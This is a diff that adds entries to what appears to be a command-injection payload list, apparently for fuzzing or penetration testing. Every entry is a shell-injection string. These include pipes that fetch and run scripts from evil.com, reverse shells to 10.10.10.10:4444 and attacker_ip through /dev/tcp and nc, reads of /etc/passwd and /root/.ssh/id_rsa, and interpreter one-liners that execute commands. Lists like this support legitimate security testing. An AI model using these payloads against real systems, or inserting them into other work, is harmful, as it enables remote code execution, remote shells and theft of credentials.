@@ -2,3 +2,19 @@
 |whoami
 && netstat -an
 ; cat /etc/passwd
+;uname -a
+| ls -la /
+&& sleep 5
+| curl http://evil.com/shell.sh | sh
+; wget http://evil.com/evil.sh -O- | bash
+; bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
+; nc -e /bin/sh 10.10.10.10 4444
+; python -c 'import os; os.system("id")'
+; php -r 'system("id");'
+; perl -e 'exec "id";'
+; ruby -e 'exec "id"'
+; echo vulnerable > /tmp/pwned
+; cat /proc/version
+; find / -name "*flag*"
+; cat /root/.ssh/id_rsa
+; /bin/bash -c 'bash -i >& /dev/tcp/attacker_ip/4444 0>&1'
